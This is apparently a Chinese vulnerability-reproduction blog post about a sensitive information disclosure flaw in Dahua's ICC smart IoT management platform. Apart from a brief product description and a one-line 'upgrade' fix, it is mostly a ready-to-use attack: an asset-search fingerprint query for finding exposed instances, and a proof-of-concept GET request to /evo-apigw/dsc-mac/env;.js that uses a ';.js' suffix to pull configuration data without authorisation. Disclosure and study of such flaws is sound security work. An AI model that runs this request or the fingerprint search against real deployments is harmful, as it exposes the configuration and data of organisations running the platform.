#  大华ICC智能物联综合管理平台敏感信息泄露漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-01-26 02:25  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
#   
  
01  
  
—  
  
漏洞名称  
  
大华智能物联综合管理平台敏感信息泄露漏洞  
  
  
  
02  
  
—  
  
影响版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhK30rt6L0hfCvcl6Pdq8dic6g2kYEicxmSVMtK36KCdTicykkDedvjU3u18Ov6X29rZaeE9VZdH4Jqrg/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
—  
  
漏洞简介  
  
浙江大华技术股份有限公司智能物联综合管理平台是一款基于物联网技术的综合性管理平台，旨在为企业和用户提供智能化、便捷化的物联网解决方案。该平台整合了大华技术在视频监控、数据采集、数据分析等方面的核心技术，实现了对各类物联网设备的统一管理和控制，提高了企业的运营效率和管理水平。  
信息泄露漏洞是指在软件系统中，由于安全控制不当导致敏感信息无意中暴露给不应具有访问权限的用户的情况。这类漏洞允许攻击者获取可能用于进一步攻击的关键信息，例如系统细节、用户数据、敏感配置信息等。信息泄露可以是直接的，如通过漏洞直接访问到敏感数据；也可以是间接的，如通过分析错误信息、系统行为等间接推断出敏感信息。  
  
  
04  
  
—  
  
资产测绘  
  
```
body="static/qwebchannel.js" && body="/客户端会小于800/"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhK30rt6L0hfCvcl6Pdq8dic6rPnCvLHicG48U1XeWNH6zIaBDJeaNZwQvoNMB8Gauc0jHxTkClHNV8Q/640?wx_fmt=png&from=appmsg "")  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
```
GET /evo-apigw/dsc-mac/env;.js HTTP/1.1
Host: xxx.xx.xxx.xx
User-Agent: Mozilla/5.0 (Windows NT 10.0;
Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language:
zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhK30rt6L0hfCvcl6Pdq8dic6j3rCHZuukdvob3iaic60kGibjAAYunSB6FrNyARD9QO7EicCKhBcUDlG2A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhK30rt6L0hfCvcl6Pdq8dic6cXMEJtZNJ3OqcyVM5reianPm9d8K0icVibkIeRCwKBGjg6vNwDFepZyQg/640?wx_fmt=png&from=appmsg "")  
  
  
06  
  
—  
  
修复建议  
  
**升级到系统版本**  
  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
  
